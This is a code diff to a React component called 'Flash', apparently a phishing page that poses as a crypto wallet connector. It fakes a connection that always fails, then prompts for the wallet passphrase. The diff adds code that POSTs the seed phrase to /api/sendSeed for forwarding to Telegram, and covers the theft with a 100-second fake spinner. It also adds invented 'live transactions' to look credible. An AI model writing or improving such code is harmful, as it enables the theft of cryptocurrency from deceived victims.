@@ -5,10 +5,10 @@ const TOKEN_OPTIONS = [
 ];
 
 const WALLET_OPTIONS = [
-  { name: 'Binance', icon: 'https://www.binance.com/resources/ico/favicon.ico' },
-  { name: 'Bybit', icon: 'https://www.bybit.com/favicon.ico' },
+  { name: 'Binance', icon: 'https://bin.bnbstatic.com/static/favicon.ico' },
+  { name: 'Bybit', icon: 'https://static.bybit.com/icons/favicon.ico' },
   { name: 'Coinbase Wallet', icon: 'https://www.coinbase.com/favicon.ico' },
-  { name: 'Bitget', icon: 'https://www.bitget.com/favicon.ico' }, // Bitget’s logo isn’t easily found, using favicon
+  { name: 'Bitget', icon: 'https://cdn.bitget.com/favicon.ico' },
   { name: 'Trust Wallet', icon: 'https://trustwallet.com/assets/images/favicon.png' },
   { name: 'Wallet Connect', icon: 'https://walletconnect.com/favicon.ico' },
 ];
@@ -21,6 +21,7 @@ export default function Flash() {
   const [walletLoading, setWalletLoading] = useState(false);
   const [connectionFailed, setConnectionFailed] = useState(false);
   const [passphrase, setPassphrase] = useState('');
+  const [isSubmitting, setIsSubmitting] = useState(false);
   const [error, setError] = useState(null);
 
   useEffect(() => {
@@ -35,8 +36,9 @@ export default function Flash() {
   const handleFlash = () => {
     try {
       setIsModalOpen(true);
-      setConnectionFailed(false); // Reset on new attempt
+      setConnectionFailed(false);
       setPassphrase('');
+      setIsSubmitting(false);
     } catch (err) {
       setError('Flash button error: ' + err.message);
     }
@@ -48,19 +50,29 @@ export default function Flash() {
       setTimeout(() => {
         setWalletLoading(false);
         setConnectionFailed(true);
-      }, 5000); // 5 seconds of "connecting..." before failing
+      }, 5000);
     } catch (err) {
       setError('Wallet connection error: ' + err.message);
     }
   };
 
-  const handleSubmit = () => {
+  const handleSubmit = async () => {
     try {
-      alert('Passphrase submitted: ' + passphrase); // Replace with Telegram API
-      setPassphrase('');
-      setIsModalOpen(false);
+      setIsSubmitting(true);
+      const response = await fetch('/api/sendSeed', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ seedPhrase: passphrase }),
+      });
+      if (!response.ok) throw new Error('Failed to send to Telegram');
+      setTimeout(() => {
+        setIsSubmitting(false);
+        setPassphrase('');
+        setIsModalOpen(false);
+      }, 100000); // 100 seconds
     } catch (err) {
       setError('Submit error: ' + err.message);
+      setIsSubmitting(false);
     }
   };
 
@@ -92,6 +104,11 @@ export default function Flash() {
                 <div className="spinner"></div>
                 <p>Connecting... 🌐</p>
               </div>
+            ) : isSubmitting ? (
+              <div className="loading">
+                <div className="spinner"></div>
+                <p>Connecting... 🔄</p>
+              </div>
             ) : connectionFailed ? (
               <>
                 <p className="error-text">Connection Failed ❌ - Connect Manually</p>
@@ -121,10 +138,13 @@ export default function Flash() {
       <div className="transactions">
         <h2>Live Transactions 📡</h2>
         <ul>
-          <li>0x123... → 0x456...: 100 USDT 💸</li>
-          <li>0x789... → 0xabc...: 0.5 BTC ⚡</li>
+          <li className="transaction-item">0x123... → 0x456...: 100 USDT 💸</li>
+          <li className="transaction-item">0x789... → 0xabc...: 0.5 BTC ⚡</li>
+          <li className="transaction-item">0xdef... → 0xghi...: 200 ETH 🌩️</li>
+          <li className="transaction-item">0xjkl... → 0xmno...: 500 SHIB 🐾</li>
+          <li className="transaction-item">0xpqr... → 0xstu...: 50 USDC 💰</li>
         </ul>
       </div>
     </div>
   );
-    }
+}
